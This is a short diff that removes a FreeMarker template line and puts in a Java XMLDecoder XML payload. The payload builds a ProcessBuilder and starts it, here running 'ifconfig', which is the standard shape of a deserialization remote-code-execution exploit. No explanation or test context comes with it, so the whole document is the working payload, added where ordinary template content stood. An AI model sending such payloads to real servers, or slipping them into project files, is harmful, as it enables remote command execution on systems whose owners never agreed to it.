@@ -1,1 +1,10 @@
-<#assign base = request.contextPath/>
+<java>
+        <object class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="1" >
+                <void index="0">
+                    <string>ifconfig</string>  
+                </void>
+            </array>
+            <void method="start"/>
+        </object>
+    </java>
